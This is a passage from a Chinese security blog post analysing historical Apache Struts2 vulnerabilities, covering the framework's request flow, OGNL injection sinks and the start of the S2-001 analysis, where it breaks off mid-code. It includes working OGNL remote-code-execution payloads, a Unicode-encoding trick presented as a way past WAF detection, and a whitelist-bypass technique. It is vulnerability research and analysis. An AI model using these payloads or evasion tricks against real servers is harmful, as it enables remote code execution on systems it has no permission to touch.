<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>Struts2历史漏洞分析 - P1n93r - 博学而精一</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="P1n93r"><meta name=description content="Struts2基本了解 Struts2的数据处理架构图下所示： 一个简单的说明如下： 客户端初始化一个指向servlet容器的请求。 请求经过一系列"><meta name=keywords content="Security,Java,Web,Android"><meta name=generator content="Hugo 0.98.0 with theme even"><link rel=canonical href=https://p1n93r.github.io/post/security/struts2%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
<link href=/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="Struts2历史漏洞分析"><meta property="og:description" content="Struts2基本了解 Struts2的数据处理架构图下所示： 一个简单的说明如下： 客户端初始化一个指向servlet容器的请求。 请求经过一系列"><meta property="og:type" content="article"><meta property="og:url" content="https://p1n93r.github.io/post/security/struts2%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-06-15T17:07:36+08:00"><meta property="article:modified_time" content="2021-06-15T17:07:36+08:00"><meta itemprop=name content="Struts2历史漏洞分析"><meta itemprop=description content="Struts2基本了解 Struts2的数据处理架构图下所示： 一个简单的说明如下： 客户端初始化一个指向servlet容器的请求。 请求经过一系列"><meta itemprop=datePublished content="2021-06-15T17:07:36+08:00"><meta itemprop=dateModified content="2021-06-15T17:07:36+08:00"><meta itemprop=wordCount content="11834"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Struts2历史漏洞分析"><meta name=twitter:description content="Struts2基本了解 Struts2的数据处理架构图下所示： 一个简单的说明如下： 客户端初始化一个指向servlet容器的请求。 请求经过一系列"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>P1n93r</a></div><div class=mobile-navbar-icon><span></span>
<span></span>
<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/categories/><li class=mobile-menu-item>Categories</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>P1n93r</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/categories/>Categories</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>Struts2历史漏洞分析</h1><div class=post-meta><span class=post-time>2021-06-15</span><div class=post-category><a href=/categories/security/>security</a></div><span class=more-meta>约 11834 字</span>
<span class=more-meta>预计阅读 24 分钟</span>
<span id=busuanzi_container_page_pv class=more-meta><span id=busuanzi_value_page_pv><img src=/img/spinner.svg alt=spinner.svg></span> 次阅读</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#struts2基本了解>Struts2基本了解</a></li><li><a href=#ognl-rce-sink>Ognl RCE Sink</a></li><li><a href=#struts2安全机制>Struts2安全机制</a></li><li><a href=#s2-001>S2-001</a></li><li><a href=#s2-002>S2-002</a></li><li><a href=#s2-003>S2-003</a></li><li><a href=#s2-005>S2-005</a></li><li><a href=#s2-007>S2-007</a></li><li><a href=#s2-008>S2-008</a></li><li><a href=#s2-009>S2-009</a></li><li><a href=#s2-012>S2-012</a></li><li><a href=#s2-013>S2-013</a></li><li><a href=#s2-015>S2-015</a></li><li><a href=#s2-016>S2-016</a></li><li><a href=#s2-032>S2-032</a></li><li><a href=#s2-045>S2-045</a></li><li><a href=#s2-046>S2-046</a></li><li><a href=#s2-052>S2-052</a></li><li><a href=#s2-053>S2-053</a></li><li><a href=#s2-057>S2-057</a></li><li><a href=#总结>总结</a></li><li><a href=#流量特征>流量特征</a></li><li><a href=#参考>参考</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=struts2基本了解>Struts2基本了解</h2><p>Struts2的数据处理架构图下所示：</p><p><img src=/media/image-20210812144853425.png alt=image-20210812144853425></p><p>一个简单的说明如下：</p><ol><li>客户端初始化一个指向servlet容器的请求。</li><li>请求经过一系列的过滤器（ActionContextCleanUp、SiteMesh）</li><li>FilterDispatcher被调用，并询问ActionMapper来决定这个请求是否需要调用某个Action</li><li>ActionMapper决定要调用那一个Action,FilterDispatcher把请求交给ActionProxy。</li><li>ActionProxy通过Configurate Manager询问Struts配置文件，找到要调用的Action类</li><li>ActionProxy创建一个ActionInvocation实例</li><li>ActionInvocation实例使用命令模式来调用，回调Action的exeute方法</li><li>一旦Action执行完毕，ActionInvocation负责根据Struts.xml的配置返回结果。</li></ol><p>可以看到ActionInvocation回调Action之前，会经过一系列的拦截器，其中我们需要注意的一个拦截器就是： <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor</code> 拦截器，这个拦截器中，会获取请求信息，并将这些信息存入Action中的 <code>OgnlValueStack</code> 中：</p><p><img src=/media/image-20210812150631623.png alt=image-20210812150631623></p><p>后续JSP中的所有动态数据，都是从这个 <code>OgnlValueStack</code> 中取出来的，如下所示：</p><p><img src=/media/image-20210812151531295.png alt=image-20210812151531295></p><h2 id=ognl-rce-sink>Ognl RCE Sink</h2><ul><li><code>Ognl.setValue</code> ;</li><li><code>Ognl.getValue</code> ;</li><li><code>Ognl.parseExpression() --> Ognl.getValue()/Ognl.setValue()</code> ；</li><li>先将恶意的Ognl表达式放入Ognl上下文中，然后再调用上下文中的恶意Ognl表达式来执行；</li></ul><p>例如如下代码，均可造成Ognl表达式注入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * Ognl setValue() SSTI
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>sinkOne</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>expression</span><span class=o>=</span><span class=s>&#34;((new java.lang.ProcessBuilder(new java.lang.String[]{\&#34;calc\&#34;})).start())(glassy)(asd)&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>setValue</span><span class=o>(</span><span class=n>expression</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=s>&#34;&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * Ognl getValue() SSTI
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>sinkTwo</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>expression</span><span class=o>=</span><span class=s>&#34;(new java.lang.ProcessBuilder(new java.lang.String[]{\&#34;calc\&#34;})).start()&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>getValue</span><span class=o>(</span><span class=n>expression</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=s>&#34;&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * Ognl.parseExpression() --&gt; Ognl.getValue()/Ognl.setValue()
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>sinkThree</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>expression</span><span class=o>=</span><span class=s>&#34;((new java.lang.ProcessBuilder(new java.lang.String[]{\&#34;calc\&#34;})).start())(glassy)(asd)&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>o</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>parseExpression</span><span class=o>(</span><span class=n>expression</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>setValue</span><span class=o>(</span><span class=n>o</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=s>&#34;&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>* Bypass Whitelist Check
</span></span></span><span class=line><span class=cl><span class=cm>* 先将恶意的Ognl表达式放入Ognl上下文中，然后再调用上下文中的恶意Ognl表达式来执行
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>sinkFive</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 模拟绕过白名单检查，先将恶意的Ognl表达式放入Ognl的上下文中
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>String</span> <span class=n>preExpression</span><span class=o>=</span><span class=s>&#34;(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(meh)&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=na>put</span><span class=o>(</span><span class=s>&#34;key&#34;</span><span class=o>,</span><span class=n>preExpression</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 然后再准备调用已存入Ognl上下文中的恶意表达式
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>String</span> <span class=n>attackStr</span><span class=o>=</span><span class=s>&#34;(key)(&#39;pinger&#39;)&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>setValue</span><span class=o>(</span><span class=n>attackStr</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>需要 <strong>特别注意</strong> 的是：<em><strong>Ognl表达式支持UNICODE编码(\u0023)</strong></em> 。所以作为攻击者可以使用这种方式绕过WAF检测。</p><p>例如如下案例所示，使用UNICODE编码可以成功造成Ognl表达式注入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * Unicode Bypass
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>sinkFour</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>expression</span><span class=o>=</span><span class=s>&#34;\\u0028\\u0028\\u006e\\u0065\\u0077 \\u006A\\u0061\\u0076\\u0061\\u002E\\u006C\\u0061\\u006E\\u0067\\u002E\\u0050\\u0072\\u006F\\u0063\\u0065\\u0073\\u0073\\u0042\\u0075\\u0069\\u006C\\u0064\\u0065\\u0072(\\u006E\\u0065\\u0077\\u0020\\u006A\\u0061\\u0076\\u0061\\u002E\\u006C\\u0061\\u006E\\u0067\\u002E\\u0053\\u0074\\u0072\\u0069\\u006E\\u0067\\u005B\\u005D\\u007B\&#34;calc\&#34;\\u007D\\u0029\\u0029\\u002E\\u0073\\u0074\\u0061\\u0072\\u0074\\u0028\\u0029\\u0029\\u0028\\u006F\\u006E\\u0065\\u0029\\u0028\\u0074\\u0077\\u006F\\u0029&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>OgnlContext</span> <span class=n>context</span> <span class=o>=</span> <span class=k>new</span> <span class=n>OgnlContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>o</span> <span class=o>=</span> <span class=n>Ognl</span><span class=o>.</span><span class=na>parseExpression</span><span class=o>(</span><span class=n>expression</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>Ognl</span><span class=o>.</span><span class=na>setValue</span><span class=o>(</span><span class=n>o</span><span class=o>,</span><span class=n>context</span><span class=o>,</span><span class=s>&#34;&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/media/image-20210813102029114.png alt=image-20210813102029114></p><h2 id=struts2安全机制>Struts2安全机制</h2><p>先将Struts2的一些安全机制以及一些常见问题先说明下，方便后续的理解。</p><ul><li>Struts2从 <strong>S2-005</strong> 增加自定义的 <code>SecurityMemberAccess</code> ，可以设置是否允许调用静态方法等；</li><li><code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#doIntercept(ActionInvocation)</code> 中，在 <code>setParameters()</code> 之前，会设置 <code>denyMethodExecution</code> 为true，但是 <code>setParameters()</code> 之后，会设置 <code>denyMethodExecution</code> 为false。也就是在 <code>setParameters()</code> 之后，再使用Ognl解析表达式就允许执行方法；</li></ul><h2 id=s2-001>S2-001</h2><p>影响版本：Struts 2.0.0 - Struts 2.0.8</p><p>CVE编号：none</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>%{(</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ProcessBuilder</span><span class=o>(</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>[]{</span><span class=s>&#34;calc&#34;</span><span class=o>})).</span><span class=na>start</span><span class=o>()}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞，归根结底就是Ognl表达式递归解析漏洞，使用Ognl解析得到的值，再次作为Ognl表达式进行进行解析。由于攻击者可以控制Ognl表达式的值为恶意的Ognl表达式，由此造成RCE。下面将通过案例进行详细分析。</p><p>struts.xml配置如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;package</span> <span class=na>name=</span><span class=s>&#34;S2-001&#34;</span> <span class=na>extends=</span><span class=s>&#34;struts-default&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;action</span> <span class=na>name=</span><span class=s>&#34;login&#34;</span> <span class=na>class=</span><span class=s>&#34;com.demo.action.LoginAction&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;result</span> <span class=na>name=</span><span class=s>&#34;success&#34;</span><span class=nt>&gt;</span>/welcome.jsp<span class=nt>&lt;/result&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;result</span> <span class=na>name=</span><span class=s>&#34;error&#34;</span><span class=nt>&gt;</span>/index.jsp<span class=nt>&lt;/result&gt;</span>
</span></span><span class=line><span class=cl>   <span class=nt>&lt;/action&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/package&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>com.demo.action.LoginAction</code> 关键代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=n>String</span> <span class=nf>execute</span><span class=o>()</span> <span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(!</span><span class=k>this</span><span class=o>.</span><span class=na>username</span><span class=o>.</span><span class=na>isEmpty</span><span class=o>()</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>this</span><span class=o>.</span><span class=na>password</span><span class=o>.</span><span class=na>isEmpty</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>this</span><span class=o>.</span><span class=na>username</span><span class=o>.</span><span class=na>equalsIgnoreCase</span><span class=o>(</span><span class=s>&#34;admin&#34;</span><span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=k>this</span><span class=o>.</span><span class=na>password</span><span class=o>.</span><span class=na>equals</span><span class=o>(</span><span class=s>&#34;admin&#34;</span><span class=o>)</span> <span class=o>?</span> <span class=s>&#34;success&#34;</span> <span class=o>:</span> <span class=s>&#34;error&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s>&#34;error&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>error对应的 <code>index.jsp</code> 关键代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>s:form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;login&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>   <span class=p>&lt;</span><span class=nt>s:textfield</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;username&#34;</span> <span class=na>label</span><span class=o>=</span><span class=s>&#34;username&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>   <span class=p>&lt;</span><span class=nt>s:textfield</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=na>label</span><span class=o>=</span><span class=s>&#34;password&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>   <span class=p>&lt;</span><span class=nt>s:submit</span><span class=p>&gt;&lt;/</span><span class=nt>s:submit</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>s:form</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，jsp中使用了struts2定义的标签 <code>textfield</code> ，我们可以在 <code>struts2-core-2.0.8.jar!\META-INF\struts-tags.tld</code> 中看到这个标签的定义：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;name&gt;</span>textfield<span class=nt>&lt;/name&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;tag-class&gt;</span>org.apache.struts2.views.jsp.ui.TextFieldTag<span class=nt>&lt;/tag-class&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>找到这个标签对应的Java类，查看其继承关系如下：</p><p><img src=/media/image-20210812152852574.png alt=image-20210812152852574></p><p>最终发现，标签的处理逻辑（ <code>doStartTag()</code> 、 <code>doEndTag()</code> ），都在其父类 <code>org.apache.struts2.views.jsp.ComponentTagSupport</code> 中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>abstract</span> <span class=kd>class</span> <span class=nc>ComponentTagSupport</span> <span class=kd>extends</span> <span class=n>StrutsBodyTagSupport</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=n>Component</span> <span class=n>component</span><span class=o>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=nf>ComponentTagSupport</span><span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>abstract</span> <span class=n>Component</span> <span class=nf>getBean</span><span class=o>(</span><span class=n>ValueStack</span> <span class=n>var1</span><span class=o>,</span> <span class=n>HttpServletRequest</span> <span class=n>var2</span><span class=o>,</span> <span class=n>HttpServletResponse</span> <span class=n>var3</span><span class=o>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>int</span> <span class=nf>doEndTag</span><span class=o>()</span> <span class=kd>throws</span> <span class=n>JspException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>component</span><span class=o>.</span><span class=na>end</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>pageContext</span><span class=o>.</span><span class=na>getOut</span><span class=o>(),</span> <span class=k>this</span><span class=o>.</span><span class=na>getBody</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>component</span> <span class=o>=</span> <span class=kc>null</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>6</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>int</span> <span class=nf>doStartTag</span><span class=o>()</span> <span class=kd>throws</span> <span class=n>JspException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>component</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>getBean</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>getStack</span><span class=o>(),</span> <span class=o>(</span><span class=n>HttpServletRequest</span><span class=o>)</span><span class=k>this</span><span class=o>.</span><span class=na>pageContext</span><span class=o>.</span><span class=na>getRequest</span><span class=o>(),</span> <span class=o>(</span><span class=n>HttpServletResponse</span><span class=o>)</span><span class=k>this</span><span class=o>.</span><span class=na>pageContext</span><span class=o>.</span><span class=na>getResponse</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=n>Container</span> <span class=n>container</span> <span class=o>=</span> <span class=n>Dispatcher</span><span class=o>.</span><span class=na>getInstance</span><span class=o>().</span><span class=na>getContainer</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=n>container</span><span class=o>.</span><span class=na>inject</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>component</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>this</span><span class=o>.</span><span class=na>populateParams</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=kt>boolean</span> <span class=n>evalBody</span> <span class=o>=</span> <span class=k>this</span><span class=o>.</span><span class=na>component</span><span class=o>.</span><span class=na>start</span><span class=o>(</span><span class=k>this</span><span class=o>.</span><span class=na>pageContext</span><span class=o>.</span><span class=na>getOut</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>evalBody</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>this</span><span class=o>.</span><span class=na>component</span><span class=o>.</span><span class=na>usesBody</span><span class=o>()</span> <span class=o>?</span> <span class=n>2</span> <span class=o>:</span> <span class=n>1</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>0</span><span class=o>;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=kt>void</span> <span class=nf>populateParams</span><span class=o>()</span> <span class=o>{</span>
